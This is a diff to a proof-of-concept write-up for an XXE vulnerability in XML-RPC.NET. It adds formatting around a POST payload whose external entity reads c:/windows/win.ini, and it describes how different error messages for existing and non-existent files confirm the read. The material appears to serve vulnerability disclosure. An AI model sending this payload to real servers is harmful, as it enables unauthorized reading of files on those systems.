@@ -7,13 +7,15 @@ Proof of Concept (PoC) for XML-RPC.NET XXE
 
 2. Leverage the following XXE POST payload:
 
+'''
 <?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
 "file://c:/windows/win.ini">]><foo>&xxe;</foo> 
+'''
 
 3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")
 
-![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207166425-19b779e7-88b1-4d63-b128-1e9af49a091a.png)
+![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207167707-80d2eb52-6402-496e-acb0-12ed9ef30400.png)
 
 4. Request an existent file on the remote server (e.g. "win.ini"). Note the error message is different when requesting access to an existing file. This validates our XXE is working as intended.
 
